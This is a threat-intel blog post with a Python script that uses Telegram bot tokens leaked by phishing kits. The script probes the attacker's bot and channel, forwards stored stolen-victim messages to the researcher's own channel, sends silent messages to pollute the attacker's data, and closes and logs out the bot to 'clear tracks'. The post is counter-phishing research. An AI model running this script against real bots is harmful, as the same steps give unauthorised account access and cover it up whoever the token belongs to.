---
layout: threat-intel-default
title:  "Telegram Enumeration"
date:   2025-08-07
description: "qwerty"
author: "RedDuck"
tags: threat-intel
---

<style>
    pre{
  counter-reset:line-numbering;
  background:#2c3e50;
  padding:14px 14px 14px 14px;
  width:600px;
  color:#ecf0f1;
  line-height:140%;
    .line::before {
      content: counter(line-numbering);
      counter-increment: line-numbering;
      padding-right: 1em;
      /* space after numbers */
      padding-left:8px;
      width: 1.5em;
      text-align: right;
      opacity: 0.5;
      color:white;
  }
}
</style>

Many phishing sites rely on the Telegram bot API to exfiltrate victim data. Oftentimes, eCriminals are either
<ul>
    <li> deploying half-baked phishing kits they've purchased from somebody with a username akin to "__1337__phisher", or </li>
    <li> inexperienced and looking to make a quick profit with minimal effort (and likely more than a pinch of vibe-coding) </li>
</ul>

Fortunately for us, this means they often leave their Telegram bot API tokens publicly accessible, either through
<ul>
    <li> hard-coding it into the site's page source </li>
    <li> exposing it in POST requests and responses </li>
</ul>

With this token (and oftentimes, the accompanying channel ID to which the information is sent), we can use the native Telegram bot API to enumerate data pertaining to the attacker's operation, and what data they have stolen so far.

THE FOLLOWING WORKFLOWS SHOULD NOT BE USED AGAINST NON-ATTACKER CHANNELS. WE ONLY ANALYZE SITES SUBMITTED TO PHISHTANK.ORG, AND ARE CONFIMRED TO BE VALID PHISHES.

<pre>
    from datetime import datetime
    import requests
    import time
    import os

    USING = "BOT_TOKEN1"

    BOT_TOKENS = {"BOT_TOKEN1": "{BOT-TOKEN}"}

    CHANNEL_IDS = {"BOT_TOKEN1": "{BOT-CHANNEL}"}

    MY_CHANNEL_IDS = {"BOT_TOKEN1": "{YOUR-CHANNEL}"}

    URL = f"https://api.telegram.org/{BOT_TOKENS[USING]}/" 
</pre>

<pre>

# Workflow that will gather data specific to the channel that the attackers are using to exfiltrate data. If the channel ID is not known, you can use 
# determine this value by interacting with the attacker's bot; the response you receive will likely contain the ID of the channel used to exfiltrate victim data
channel_endpoints = {
    "getChatAdministrators":f"getChatAdministrators?chat_id={CHANNEL_IDS[USING]}",
    "getChat":f"getChat?chat_id={CHANNEL_IDS[USING]}",
    "getChatMembersCount":f"getChatMembersCount?chat_id={CHANNEL_IDS[USING]}",
    "createChatInviteLink":f"createChatInviteLink?chat_id={CHANNEL_IDS[USING]}",
}

</pre>

<pre>

# Workflow that will gather data on the bot, such as 
# - Name
# - Recent updates
# - Description
# and other general information that can be used later.
gen_endpoints = {
    "getUpdates":"getUpdates",
    "getWebhookInfo":"getWebhookInfo",
    "getMe":"getMe",
    "getMyCommands":"getMyCommands",
    "getMyName":"getMyName",
    "getMyDescription":"getMyDescription",
    "getAvailableGifts":"getAvailableGifts",
    "getWebhookInfo":"getWebhookInfo",
}

</pre>

<pre>

# Workflow that will remove evidence of your interaction with the attacker's bot. These endpoints will
# - Leave the chat you created to enumerate stolen data
# - Close the bot
# - Log the bot out
clear_tracks = {
    "leaveChat":f"leaveChat?chat_id={MY_CHANNEL_IDS[USING]}",
    "close":f"close",
    "logOut":f"logOut"
}

</pre>

<pre>

# Workflow that will send data specified by you to the attacker's channel. By default, this workflow sends empty messages, and disables notifications, so as to minimize the likelihood that the attacker will immediately detect any anomolous behavior. You may use this workflow to pollute the attacker's
# dataset, enumerate channel ID(s), etc.
sendMessage = {
    "sendMessage":f"sendMessage?text=''&chat_id={MY_CHANNEL_IDS[USING]}&disable_notification=True"
}

</pre>

<pre>

# Workflow to enumerate what data the attackers have stolen. 
forwardMessage = {
    "forwardMessage": f"forwardMessage?chat_id={MY_CHANNEL_IDS[USING]}&from_chat_id={CHANNEL_IDS[USING]}&message_id="
}

</pre>

<pre>

folder = f"{USING}-{datetime.today().strftime('%m-%d-%y')}"
try:
    os.mkdir(f"{folder}")
except:
    print("Folder already exists")
os.chdir(f"{folder}")

</pre>

<pre>

# This method will enumerate the contents of the attacker's chat, according to the message IDS that are 
# entered into X and Y (e.g., (0,1000) will gather the messages with IDs between 0 and 999).
def enumerate():
    for inc in range(X,Y): 
        for key in forwardMessage.keys():
            looking_at = key
            response = requests.get(URL+forwardMessage[looking_at]+str(inc))
            if "Bad Request: message to forward not found" not in response.text:
                with open(f"{looking_at}.json","a") as a:
                    a.write(f"{response.text}\n")

</pre>

<pre>

# This method queries the specific endpoint name that you enter as a parameter, so long as it's dictionary
# value exists elsewhere in the code.
def query_endpoint(endpoint):
    for key in endpoint.keys():
        looking_at = key
        response = requests.get(URL+endpoint[looking_at])
        print(response.text)
        if '{"ok":true' in response.text:
            with open(f"{looking_at}.json","a") as a:
                a.write(f"{response.text}\n")

</pre>

<pre>
# Gathers preliminary data on the attacker's Telegram channel, as well as information about the bot 
# itself.
def initial_recon():
    query_endpoint(gen_endpoints)
    query_endpoint(channel_endpoints)

</pre>

<pre>

# Define which stage of operations you want to execute (reconnaissance,enumeration, or clearing evidence
# of involvement)

STAGE = "#"

match STAGE:
    case "1":
        initial_recon()
    case "2":
        enumerate()
    case "3":
        query_endpoint(clear_tracks)

os.chdir("..")
</pre>

<script>
$("pre").html(function (index, html) {
    return html.replace(/^(.*)$/mg, "<span 
class=\"line\">$1</span>")
});
</script>